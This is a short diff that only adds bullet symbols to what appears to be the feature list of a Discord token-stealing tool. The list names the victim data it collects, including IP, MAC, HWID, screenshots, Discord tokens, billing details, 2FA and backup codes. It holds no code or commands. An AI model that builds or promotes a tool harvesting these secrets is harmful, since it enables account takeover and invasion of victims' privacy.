@@ -1,43 +1,43 @@
 =============================
 
-**System info**
+**System info** 
 
-User
+♦ User
 
-OS
+♦ OS
 
-System
+♦ System
 
-Network IP
+♦ Network IP
 
-Wifi
+♦ Wifi
 
-Mac
+♦ Mac
 
-Hwid
+♦ Hwid
 
-PC Specs
+♦ PC Specs
 
-Screenshot
+♦ Screenshot
 
 =============================
 
 **Discord Info**
 
-Token
+♦ Token
 
-Nitro
+♦ Nitro
 
-Billing
+♦ Billing
 
-2FA
+♦ 2FA
 
-Email
+♦ Email
 
-Phone
+♦ Phone
 
-Gift Codes
+♦ Gift Codes
 
-Backup Codes
+♦ Backup Codes
 
 =============================
